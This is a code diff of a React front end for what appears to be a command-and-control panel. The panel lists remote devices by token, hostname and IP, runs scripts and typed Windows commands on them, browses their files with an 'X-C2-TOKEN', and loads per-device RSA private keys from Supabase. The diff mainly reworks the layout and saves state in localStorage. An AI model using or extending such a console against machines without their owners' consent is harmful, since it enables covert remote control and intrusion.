@@ -5,15 +5,17 @@ import './modern.css'
 
 export default function FreshUI() {
   const DEFAULT_RAW = import.meta.env.VITE_API_BASE || 'http://localhost:8080/api'
-  const [host, setHost] = useState(DEFAULT_RAW.replace(/\/$/, ''))
+  const [host, setHost] = useState(() => {
+    const saved = (typeof window !== 'undefined') ? localStorage.getItem('ui.host') : null
+    return (saved || DEFAULT_RAW).replace(/\/$/, '')
+  })
   const API_BASE = useMemo(() => `${host}/py_simple`, [host])
 
-  const [activeTab, setActiveTab] = useState('devices')
   const [socketStatus, setSocketStatus] = useState('disconnected')
   const socketRef = useRef(null)
 
   const [devices, setDevices] = useState([])
-  const [selectedToken, setSelectedToken] = useState('')
+  const [selectedToken, setSelectedToken] = useState(() => (typeof window !== 'undefined' ? localStorage.getItem('ui.selectedToken') || '' : ''))
   const [connectedCount, setConnectedCount] = useState(0)
   const [systemOnline, setSystemOnline] = useState(false)
   const [status, setStatus] = useState('')
@@ -22,7 +24,7 @@ export default function FreshUI() {
   // Keys
   const [publicKey, setPublicKey] = useState('')
   const [privateKey, setPrivateKey] = useState('')
-  const [userId, setUserId] = useState('')
+  const [userId, setUserId] = useState(() => (typeof window !== 'undefined' ? localStorage.getItem('ui.userId') || '' : ''))
 
   // Scripts
   const [scripts, setScripts] = useState([]) // [{id, label, command}]
@@ -35,6 +37,9 @@ export default function FreshUI() {
   const [files, setFiles] = useState([]) // [{name, is_dir, size}]
   const [c2Path, setC2Path] = useState('') // '' means root
   const [c2Token, setC2Token] = useState('') // optional X-C2-TOKEN
+  const [showFiles, setShowFiles] = useState(false) // optional extra panel
+  const [collapseOnline, setCollapseOnline] = useState(false)
+  const [collapseOffline, setCollapseOffline] = useState(true)
 
   useEffect(() => {
     try {
@@ -55,6 +60,26 @@ export default function FreshUI() {
     return () => clearInterval(id)
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [API_BASE])
+
+  // Persist host, userId, selectedToken
+  useEffect(() => { try { localStorage.setItem('ui.host', host) } catch {} }, [host])
+  useEffect(() => { try { localStorage.setItem('ui.userId', userId) } catch {} }, [userId])
+  useEffect(() => { try { if (selectedToken) localStorage.setItem('ui.selectedToken', selectedToken) } catch {} }, [selectedToken])
+
+  // Auto-load keys when userId and selectedToken are set
+  useEffect(() => {
+    if (!userId || !selectedToken) return
+    ;(async () => {
+      try {
+        const rec = await loadKeysFromSupabase({ userId, token: selectedToken })
+        if (rec) {
+          setPublicKey(rec.public_key_pem || '')
+          setPrivateKey(rec.private_key_pem || '')
+          setStatus('Loaded keys for selection')
+        }
+      } catch (_) { /* ignore */ }
+    })()
+  }, [userId, selectedToken])
 
   async function refreshAll() {
     await Promise.allSettled([
@@ -221,11 +246,46 @@ export default function FreshUI() {
 
       <main className="ui-main">
         <aside className="ui-sidebar">
-          <button className={`tab-btn ${activeTab==='devices'?'active':''}`} onClick={()=>setActiveTab('devices')}>Devices</button>
-          <button className={`tab-btn ${activeTab==='keys'?'active':''}`} onClick={()=>setActiveTab('keys')}>Keys</button>
-          <button className={`tab-btn ${activeTab==='scripts'?'active':''}`} onClick={()=>setActiveTab('scripts')}>Scripts</button>
-          <button className={`tab-btn ${activeTab==='terminal'?'active':''}`} onClick={()=>setActiveTab('terminal')}>Terminal</button>
-          <button className={`tab-btn ${activeTab==='files'?'active':''}`} onClick={()=>setActiveTab('files')}>Files</button>
+          <div className="tree">
+            <div className="tree-title">Devices</div>
+            <div className="tree-section">
+              <button className="tree-section-header" onClick={()=>setCollapseOnline(v=>!v)}>
+                <span className={`chev ${collapseOnline?'rot':''}`}>▸</span>
+                Online <span className="muted">({devices.filter(d=>d.connected).length})</span>
+              </button>
+              {!collapseOnline && (
+                <ul className="tree-list">
+                  {devices.filter(d=>d.connected).map(d => (
+                    <li key={d.token} className={`tree-item ${selectedToken===d.token?'selected':''}`} onClick={()=>setSelectedToken(d.token)}>
+                      <span className="status-dot ok"></span>
+                      <span className="name">{d.hostname || d.token.slice(0,8)}</span>
+                      <span className="meta">{d.ip || ''}</span>
+                    </li>
+                  ))}
+                </ul>
+              )}
+            </div>
+            <div className="tree-section">
+              <button className="tree-section-header" onClick={()=>setCollapseOffline(v=>!v)}>
+                <span className={`chev ${collapseOffline?'rot':''}`}>▸</span>
+                Offline <span className="muted">({devices.filter(d=>!d.connected).length})</span>
+              </button>
+              {!collapseOffline && (
+                <ul className="tree-list">
+                  {devices.filter(d=>!d.connected).map(d => (
+                    <li key={d.token} className={`tree-item ${selectedToken===d.token?'selected':''}`} onClick={()=>setSelectedToken(d.token)}>
+                      <span className="status-dot warn"></span>
+                      <span className="name">{d.hostname || d.token.slice(0,8)}</span>
+                      <span className="meta">{d.ip || ''}</span>
+                    </li>
+                  ))}
+                </ul>
+              )}
+            </div>
+            <div className="sidebar-actions">
+              <button className="btn" onClick={refreshDevices}>Refresh</button>
+            </div>
+          </div>
         </aside>
 
         <section className="ui-content">
@@ -245,27 +305,27 @@ export default function FreshUI() {
             </div>
           </div>
 
-          {activeTab === 'devices' && (
-            <div className="panel card">
-              <div className="panel-title">Devices</div>
-              <div className="grid two">
-                <div>
-                  <label className="field-label">Select device</label>
-                  <select className="input" value={selectedToken} onChange={(e)=>setSelectedToken(e.target.value)}>
-                    <option value="">Choose a device</option>
-                    {deviceNames.map(d => (<option key={d.value} value={d.value}>{d.label}</option>))}
-                  </select>
-                </div>
-                <div className="actions-end">
-                  <button className="btn" onClick={refreshDevices}>Refresh</button>
-                </div>
+          {/* Device summary */}
+          <div className="panel card">
+            <div className="panel-title">Device</div>
+            {selectedToken ? (
+              <div className="kv">
+                {(() => { const d = devices.find(x=>x.token===selectedToken); return d ? (
+                  <>
+                    <div><span className="k">Token</span><span className="v">{d.token}</span></div>
+                    <div><span className="k">Hostname</span><span className="v">{d.hostname || '—'}</span></div>
+                    <div><span className="k">IP</span><span className="v">{d.ip || '—'}</span></div>
+                    <div><span className="k">Status</span><span className="v">{d.connected ? 'online' : 'offline'}</span></div>
+                  </>
+                ) : null })()}
               </div>
-              <div className="muted" style={{marginTop:8}}>Tip: devices refresh every 5 seconds automatically.</div>
-            </div>
-          )}
+            ) : (
+              <div className="muted">Select a device from the left.</div>
+            )}
+          </div>
 
-          {activeTab === 'keys' && (
-            <div className="panel card">
+          {/* RSA Key Management */}
+          <div className="panel card">
               <div className="panel-title">RSA Key Management</div>
               <div className="actions">
                 <button className="btn primary" disabled={loading} onClick={generateKeys}>Generate Keys</button>
@@ -284,11 +344,10 @@ export default function FreshUI() {
                   <textarea className="input mono" rows={10} placeholder="Private key will appear here" value={privateKey} onChange={(e)=>setPrivateKey(e.target.value)} />
                 </div>
               </div>
-            </div>
-          )}
+          </div>
 
-          {activeTab === 'scripts' && (
-            <div className="panel card">
+          {/* Scripts */}
+          <div className="panel card">
               <div className="panel-title">Scripts</div>
               <div className="script-grid">
                 {scripts.map(s => (
@@ -302,21 +361,20 @@ export default function FreshUI() {
               <div className="actions">
                 <button className="btn primary" disabled={loading || !selectedToken} onClick={runSelectedScripts}>Run Selected</button>
               </div>
-            </div>
-          )}
+          </div>
 
-          {activeTab === 'terminal' && (
-            <div className="panel card">
+          {/* Terminal */}
+          <div className="panel card">
               <div className="panel-title">Terminal</div>
               <label className="field-label">Command</label>
               <input className="input" placeholder="Enter Windows command..." value={command} onChange={(e)=>setCommand(e.target.value)} />
               <div className="actions">
                 <button className="btn primary" disabled={loading || !selectedToken || !command.trim()} onClick={executeCommand}>Execute</button>
               </div>
-            </div>
-          )}
+          </div>
 
-          {activeTab === 'files' && (
+          {/* Files (optional) */}
+          {showFiles && (
             <div className="panel card">
               <div className="panel-title">Files</div>
               <div className="grid two" style={{alignItems:'end'}}>
